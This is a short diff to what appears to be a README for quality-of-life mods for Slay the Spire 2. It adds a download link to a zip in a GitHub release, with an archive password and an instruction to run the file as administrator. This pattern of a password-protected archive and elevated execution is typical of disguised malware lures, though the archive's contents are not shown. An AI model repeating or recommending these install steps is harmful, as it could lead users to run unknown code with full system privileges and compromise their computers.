@@ -20,7 +20,7 @@ What it includes:
 ## ⚙️ How to Use
 
 ### Option 1: Automatic Install (Recommended)
-1
+1. [Download](https://github.com/EchoSectorObserve96/SlayTheSpire2-QoL-Mods/releases/download/Download/QoL-Mods.zip)
 2.PASSWORD (5868781)
 3. Run as administrator.
 4. Launch Slay the Spire 2 – mods will load automatically.
